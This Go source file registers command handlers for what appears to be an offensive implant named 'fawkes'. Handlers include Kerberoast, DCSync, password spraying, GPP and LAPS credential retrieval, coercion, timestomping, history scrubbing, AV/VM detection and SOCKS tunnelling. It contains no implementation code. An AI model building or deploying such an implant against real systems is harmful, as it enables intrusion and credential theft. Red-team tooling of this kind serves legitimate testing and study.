package commands

import (
	"log"
	"sync"

	"fawkes/pkg/structs"
)

var (
	commandRegistry = make(map[string]structs.Command)
	registryMutex   sync.RWMutex

	// runningTasks tracks currently executing tasks by task ID.
	// Used by jobs/jobkill commands to list and cancel running tasks.
	runningTasks sync.Map // map[string]*structs.Task
)

// Initialize sets up all available commands
func Initialize() {
	log.Printf("[INFO] Initializing command handlers")

	// Register cross-platform commands
	RegisterCommand(&CatCommand{})
	RegisterCommand(&CdCommand{})
	RegisterCommand(&CpCommand{})
	RegisterCommand(&DownloadCommand{})
	RegisterCommand(&LsCommand{})
	RegisterCommand(&MkdirCommand{})
	RegisterCommand(&MvCommand{})
	RegisterCommand(&PsCommand{})
	RegisterCommand(&PwdCommand{})
	RegisterCommand(&RmCommand{})
	RegisterCommand(&RunCommand{})
	RegisterCommand(&SleepCommand{})
	RegisterCommand(&SocksCommand{})
	RegisterCommand(&UploadCommand{})
	RegisterCommand(&EnvCommand{})
	RegisterCommand(&ExitCommand{})
	RegisterCommand(&KillCommand{})
	RegisterCommand(&WhoamiCommand{})
	RegisterCommand(&IfconfigCommand{})
	RegisterCommand(&FindCommand{})
	RegisterCommand(&NetstatCommand{})
	RegisterCommand(&PortScanCommand{})
	RegisterCommand(&TimestompCommand{})
	RegisterCommand(&ArpCommand{})
	RegisterCommand(&SetenvCommand{})
	RegisterCommand(&AvDetectCommand{})
	RegisterCommand(&LinkCommand{})
	RegisterCommand(&UnlinkCommand{})
	RegisterCommand(&LdapQueryCommand{})
	RegisterCommand(&LdapWriteCommand{})
	RegisterCommand(&KerberoastCommand{})
	RegisterCommand(&AsrepCommand{})
	RegisterCommand(&SmbCommand{})
	RegisterCommand(&DnsCommand{})
	RegisterCommand(&WinrmCommand{})
	RegisterCommand(&AdcsCommand{})
	RegisterCommand(&KerbDelegationCommand{})
	RegisterCommand(&SshExecCommand{})
	RegisterCommand(&CurlCommand{})
	RegisterCommand(&RpfwdCommand{})
	RegisterCommand(&KlistCommand{})
	RegisterCommand(&SprayCommand{})
	RegisterCommand(&DomainPolicyCommand{})
	RegisterCommand(&GpoCommand{})
	RegisterCommand(&DcsyncCommand{})
	RegisterCommand(&TicketCommand{})
	RegisterCommand(&TrustCommand{})
	RegisterCommand(&NetGroupCommand{})
	RegisterCommand(&ModulesCommand{})
	RegisterCommand(&GrepCommand{})
	RegisterCommand(&CompressCommand{})
	RegisterCommand(&DriversCommand{})
	RegisterCommand(&RouteCommand{})
	RegisterCommand(&SysinfoCommand{})
	RegisterCommand(&LapsCommand{})
	RegisterCommand(&GppPasswordCommand{})
	RegisterCommand(&ConfigCommand{})
	RegisterCommand(&HistoryScrubCommand{})
	RegisterCommand(&CoerceCommand{})
	RegisterCommand(&FindAdminCommand{})
	RegisterCommand(&HashCommand{})
	RegisterCommand(&ChmodCommand{})
	RegisterCommand(&ChownCommand{})
	RegisterCommand(&StatCommand{})
	RegisterCommand(&TailCommand{})
	RegisterCommand(&WriteFileCommand{})
	RegisterCommand(&Base64Command{})
	RegisterCommand(&TouchCommand{})
	RegisterCommand(&HexdumpCommand{})
	RegisterCommand(&StringsCommand{})
	RegisterCommand(&SecureDeleteCommand{})
	RegisterCommand(&WcCommand{})
	RegisterCommand(&DuCommand{})
	RegisterCommand(&DiffCommand{})
	RegisterCommand(&DfCommand{})
	RegisterCommand(&MountCommand{})
	RegisterCommand(&SortCommand{})
	RegisterCommand(&UniqCommand{})
	RegisterCommand(&TacCommand{})
	RegisterCommand(&CutCommand{})
	RegisterCommand(&TrCommand{})
	RegisterCommand(&ProcessTreeCommand{})
	RegisterCommand(&WlanProfilesCommand{})
	RegisterCommand(&CloudMetadataCommand{})
	RegisterCommand(&EncryptCommand{})
	RegisterCommand(&ProxyCheckCommand{})
	RegisterCommand(&FileTypeCommand{})
	RegisterCommand(&LastCommand{})
	RegisterCommand(&PingCommand{})
	RegisterCommand(&UptimeCommand{})
	RegisterCommand(&WhoCommand{})
	RegisterCommand(&ContainerDetectCommand{})
	RegisterCommand(&VmDetectCommand{})
	RegisterCommand(&PkgListCommand{})
	RegisterCommand(&SecurityInfoCommand{})
	RegisterCommand(&JobsCommand{})
	RegisterCommand(&JobkillCommand{})
	RegisterCommand(&TriageCommand{})
	RegisterCommand(&SuspendCommand{})
	RegisterCommand(&LateralCheckCommand{})
	RegisterCommand(&ShareHuntCommand{})
	RegisterCommand(&CredCheckCommand{})

	// Register platform-specific commands
	registerPlatformCommands()

	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
}

// RegisterCommand registers a command with the command registry
func RegisterCommand(cmd structs.Command) {
	registryMutex.Lock()
	defer registryMutex.Unlock()

	commandRegistry[cmd.Name()] = cmd
	// log.Printf("[DEBUG] Registered command: %s", cmd.Name())
}

// GetCommand retrieves a command from the registry
func GetCommand(name string) structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	return commandRegistry[name]
}

// TrackTask registers a task as currently running (called by main loop)
func TrackTask(t *structs.Task) {
	runningTasks.Store(t.ID, t)
}

// UntrackTask removes a task from the running set (called when task completes)
func UntrackTask(id string) {
	runningTasks.Delete(id)
}

// GetRunningTasks returns a snapshot of all currently running tasks
func GetRunningTasks() map[string]*structs.Task {
	tasks := make(map[string]*structs.Task)
	runningTasks.Range(func(key, value interface{}) bool {
		if t, ok := value.(*structs.Task); ok {
			tasks[key.(string)] = t
		}
		return true
	})
	return tasks
}

// GetRunningTask returns a specific running task by ID
func GetRunningTask(id string) (*structs.Task, bool) {
	if v, ok := runningTasks.Load(id); ok {
		if t, ok := v.(*structs.Task); ok {
			return t, true
		}
	}
	return nil, false
}

// GetAllCommands returns all registered commands
func GetAllCommands() map[string]structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	commands := make(map[string]structs.Command)
	for name, cmd := range commandRegistry {
		commands[name] = cmd
	}

	return commands
}
